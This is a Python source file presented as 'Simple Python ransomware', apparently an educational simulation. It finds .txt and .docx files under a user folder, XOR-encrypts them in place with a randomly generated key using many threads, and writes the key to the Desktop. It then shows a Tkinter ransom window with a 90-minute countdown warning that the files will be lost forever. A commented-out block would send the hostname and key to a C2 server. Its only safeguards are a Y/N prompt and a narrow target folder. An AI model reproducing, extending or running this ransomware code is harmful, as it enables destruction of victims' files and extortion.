# Simple Python ransomware
import os
import random
import base64
import socket
from threading import Thread
from queue import Queue
import getpass
import string
import tkinter as tk



#setting up a safeguard to avid running the code in the host machine
extend = "\\"
pc_username = getpass.getuser()
desktop_path = "C:\\Users\\"+pc_username+"\\Desktop"
decrypt_key = "decrypt_key.txt"
safeguard = input("Are you sure you wanna run this program ? Y/N \n")
if safeguard != 'Y':
    quit()

#files to be encrypted
Extension_to_be_encrypted = ('.txt','.docx' , )

#Grab all the files with the required extension
file_lists_paths = []
for root, dirs, files in os.walk("C:\\Users\\"+pc_username+"\\Music\\Copy") :
    for file in files :
        file_path, file_ext = os.path.splitext(root+extend+file) #separate the name and the extension
        if file_ext in Extension_to_be_encrypted :
            file_lists_paths.append(root+extend+file)
#
# for f in file_lists_paths:
#      print(f)

#Generate a key to ecnrypt
lower = string.ascii_lowercase
upper = string.ascii_uppercase
digits = string.digits
special_characters = string.punctuation

combined_characters = lower + upper + digits + special_characters


key = ""
encryption_level = 128 // 8     #this is how many bytes the encryption level is
char_pool = []                  #character from which the key can be made of
# for i in range (0x00 , 0xFF) :  #All possible character
for i in (combined_characters) :  #All possible character
    char_pool.append(i)
for i in range(encryption_level) :
    key += random.choice(char_pool) #This is the actual key for encryption

#The decription key will be on the Desktop
with open(desktop_path + extend + decrypt_key , "w", encoding="utf-8") as f:
    f.write(key)

print(key)

#grab the hostname and sned it along with the key to the C2 server
# hostname = os.getenv("COMPUTERNAME")
#connect to C2 SERVER
# ip_address = "127.0.0.1"
# port = 9000
# with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s :
#     s.connect((ip_address,port))
#     s.send(f'[{time}] - {hostname} : {key}').encode('utf-8')



#encrypt the files
def encrypt(key):
    while q.not_empty :
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try :
            with open(file,"rb") as f :
                data = f.read()
            with open(file,"wb") as f :
                for byte in data : #rewriting the bytes
                    xor_byte = byte ^ ord(key[index]) #ord grabs the ASCII value of the character
                    f.write(xor_byte.to_bytes(1 ,"little"))
                    if index >= max_index :
                        index = 0
                    else :
                        index += 1
        except:
            print(f'Failed to encrypt the {file}')
        q.task_done()

q = Queue() #special list that can help in multi threading
for file in file_lists_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon = True)
    thread.start()

q.join()
print("Encryption Successful")


def countdown(count):
    # change text in label
    # count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))

root = tk.Tk()
root.title('Python_Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n'
                             'WARNING: THERE IS NO SECOND ATTEMPT TO ENTER THE CORRECT KEY \n\n IF IT IS WRONG YOU LOSE YOUR FILES FOREVER', font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='red', bg='blue')
label.pack()

# call countdown first time
countdown('01:30:00')
# root.after(0, countdown, 5)
root.mainloop()

# print(hostname)




